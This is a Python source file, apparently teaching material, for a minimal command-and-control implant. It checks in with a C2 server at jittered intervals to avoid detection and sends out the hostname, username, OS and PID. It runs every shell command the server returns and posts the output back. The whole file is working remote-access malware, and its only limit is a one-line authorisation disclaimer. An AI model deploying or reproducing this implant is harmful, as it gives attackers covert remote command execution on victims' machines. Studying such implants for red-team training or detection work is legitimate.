"""
Minimal C2 implant — beacons to the C2 server and executes received tasks.

Teaches the implant side of a C2 framework:
  - Periodic check-in ("beaconing") with jitter to avoid fixed-interval detection
  - Task execution: run shell commands, return output
  - The data the implant exfiltrates in each check-in (hostname, user, OS, PID)

Protocol: HTTP POST to /api/beacon every INTERVAL +/- JITTER seconds.
The server returns a task dict (or null); the implant executes it and POSTs
the output to /api/result.

> Only deploy implants on systems you own or have explicit written authorisation to test.

Usage: python3 beacon.py C2_URL [INTERVAL] [JITTER]
"""
from __future__ import annotations

import json
import os
import platform
import random
import subprocess
import sys
import time
import urllib.request
import urllib.error

C2_URL   = sys.argv[1] if len(sys.argv) > 1 else "http://c2-server:5000"
INTERVAL = float(sys.argv[2]) if len(sys.argv) > 2 else 5.0
JITTER   = float(sys.argv[3]) if len(sys.argv) > 3 else 1.0

SID: str | None = None


def post(path: str, data: dict) -> dict:
    body = json.dumps(data).encode()
    req = urllib.request.Request(
        f"{C2_URL}{path}",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read())
    except urllib.error.URLError:
        return {}


def check_in() -> dict | None:
    global SID
    payload = {
        "sid":      SID,
        "hostname": platform.node(),
        "username": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "os":       platform.system() + " " + platform.release(),
        "pid":      os.getpid(),
    }
    resp = post("/api/beacon", payload)
    if resp.get("sid"):
        SID = resp["sid"]
    return resp.get("task")


def run_task(task: dict) -> str:
    cmd = task.get("cmd", "")
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=10
        )
        return (result.stdout + result.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "(command timed out)"
    except Exception as e:
        return f"(error: {e})"


def main() -> None:
    print(f"[beacon] C2={C2_URL}  interval={INTERVAL}s  jitter={JITTER}s", flush=True)
    while True:
        task = check_in()
        if task:
            print(f"[beacon] Executing: {task.get('cmd')!r}", flush=True)
            output = run_task(task)
            post("/api/result", {"sid": SID, "task": task, "output": output})
            print(f"[beacon] Output: {output[:80]}…" if len(output) > 80 else f"[beacon] Output: {output}", flush=True)

        sleep = INTERVAL + random.uniform(-JITTER, JITTER)
        time.sleep(max(0.5, sleep))


if __name__ == "__main__":
    main()
